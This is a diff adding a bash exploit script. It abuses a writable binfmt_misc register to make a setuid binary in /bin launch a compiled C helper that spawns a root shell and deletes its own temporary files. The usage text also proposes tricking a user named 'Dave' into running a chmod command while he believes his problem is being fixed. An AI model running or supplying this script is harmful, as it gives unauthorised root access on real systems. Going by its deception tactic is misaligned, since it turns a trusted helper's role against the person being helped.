@@ -1,0 +1,80 @@
+#!/bin/bash
+
+searchsuid="/bin/"
+mountpoint="/proc/sys/fs/binfmt_misc"
+
+test -n "$1" && echo -e "" \
+"Usage: $0 \n"\
+"\tGives you a root shell if /proc/sys/fs/binfmt_misc/register is writeable,\n"\
+"\tnote that it must be enforced by any other mean before your try this, for\n"\
+"\texample by typing something like \"sudo chmod +6 /*/*/f*/*/*r\" while Dave\n"\
+"\tis thinking that you are fixing his problem.\n" && exit 0
+
+function not_writeable()
+{
+	test ! -w "$mountpoint/register"
+}
+
+function pick_suid()
+{
+	find "$1" -perm -4000 -print|while read -r candidate;
+	do
+		test -x "$candidate" || continue
+		echo "$candidate"
+	done|tail -n 1
+}
+
+function read_magic()
+{
+	(grep -q -o "'" <<< "$1") && return 1
+	(egrep -q -o "[^0-9]" <<< "$2") && return 1
+	python -c "print(open('$1', 'rb').read()[:$2].replace('"'\x00'"', '"'\\x00'"'))"
+}
+
+not_writeable && echo "Error: $mountpoint/register is not writeable" && exit 1
+
+target="$(pick_suid "$searchsuid")"
+test -z "$target" && echo "Error: Unable to find a suid binary in $searchsuid" && exit 1
+
+binfmt_magic="$(read_magic "$target" "126")"
+test -z "$binfmt_magic" && echo "Error: Unable to retrieve a magic for $target" && exit 1
+
+fmtsrc="$(mktemp /tmp/XXXXXXXX.c)"
+fmtname="$(mktemp -u XXXX)"
+fmtinterpr="$(mktemp)"
+
+(cat > "$fmtsrc") <<- __EOF__
+	#include <stdlib.h>
+	#include <unistd.h>
+	#include <stdio.h>
+	#include <pwd.h>
+
+	int main(int argc, char *argv[])
+	{	
+		// remove our temporary files
+		unlink("$fmtsrc");
+		unlink("$fmtinterpr");
+		
+		// remove the unused binary format
+		FILE* fmt = fopen("$mountpoint/$fmtname", "w");
+		fprintf(fmt, "-1\\n");
+		fclose(fmt);
+
+		// MOTD
+		uid_t uid = geteuid();
+		struct passwd *pw = getpwuid(uid);
+		fprintf(stderr, "uid=%u(%s)\\n", uid, pw->pw_name);
+
+		// welcome home
+		char* sh[] = {"/bin/sh", (char*) 0};
+		execvp(sh[0], sh);
+		return 1;
+	}
+__EOF__
+gcc -o "$fmtinterpr" "$fmtsrc"
+chmod a+x "$fmtinterpr"
+
+binfmt_line="_${fmtname}_M__${binfmt_magic}__${fmtinterpr}_OC"
+echo "$binfmt_line" > "$mountpoint"/register
+
+exec "$target"
